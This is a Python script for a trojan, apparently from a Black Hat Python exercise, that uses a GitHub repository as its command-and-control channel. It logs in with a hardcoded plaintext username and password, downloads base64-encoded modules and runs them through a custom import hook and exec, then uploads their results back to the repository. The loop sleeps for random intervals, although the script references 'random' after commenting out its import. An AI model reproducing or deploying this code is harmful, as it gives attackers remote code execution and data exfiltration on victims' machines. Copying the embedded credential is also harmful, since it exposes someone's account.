#!/usr/bin/env python3


import os, sys
import imp
import time
import json
import queue
import base64
# import random
import threading

from github3 import login



# trojan id
trojan_id = 'simple'
trojan_config = '%s.json' % trojan_id
trojan_data = 'data/%s/' % trojan_id
trojan_modules = []
configured = False
task_queue = queue.Queue()


def connect2git():
    git = login(username='wick-ztone', password='1097393685Ss')
    repo = git.repository('wick-ztone', 'BHP-Chapter7')
    br = repo.branch('master')
    return git, repo, br


def get_contents(filepath):
    git, repo, br = connect2git()
    tree = br.commit.commit.tree.recurse()
    for f in tree.tree:
        if filepath in f.path:
            print('[*] Found file %s' % filepath)
            blob = repo.blob(f.sha)
            return blob.content
    return None


def get_config():
    global configured
    _json = get_contents(trojan_config)
    conf = json.loads(base64.b64decode(_json))
    configured = True
    for task in conf:
        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])
    return conf


def store_module_result(data):
    git, repo, br = connect2git()
    # remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
    remote_path = 'data/%s/%d.data' % (trojan_id, id(trojan_id))
    repo.create_file(remote_path, 
                     'Push the data of %s' % trojan_id, 
                     base64.b64encode(data))



class GitImport(object):
    def __init__(self):
        self.__code = ''
    
    def find_module(self, fullname, path=None):
        if configured:
            print('[*] Attempting to retrieve %s' % fullname)
            new_library = get_contents('modules/%s' % fullname)
            if new_library:
                self.__code = base64.b64decode(new_library)
                print('[*] Successfully retrieved %s' % fullname)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.__code, module.__dict__)
        sys.modules[name] = module
        return module


def run_module(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)


# main trojan loop
sys.meta_path = [GitImport()]
while True:
    if task_queue.empty():
        conf = get_config()
        for task in conf:
            t = threading.Thread(target=run_module, args=(task['module'], ))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
